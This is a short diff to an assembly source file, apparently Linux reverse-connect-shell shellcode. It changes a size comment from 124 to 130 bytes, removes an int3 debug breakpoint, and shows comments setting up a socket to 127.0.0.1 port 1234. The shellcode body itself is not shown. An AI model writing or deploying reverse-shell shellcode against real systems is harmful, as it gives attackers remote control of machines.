@@ -27,14 +27,13 @@
 ;  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
 ;  POSSIBILITY OF SUCH DAMAGE.
 ;
-; 124 byte reverse connect shell
+; 130 byte reverse connect shell
 ;
 ; Tested on 32 and 64-bit versions of Linux
 ;
 
     bits    32
     
-    int3
     ; sa.sin_family = AF_INET;
     ; sa.sin_addr   = inet_addr("127.0.0.1");
     ; sa.sin_port   = htons(1234);
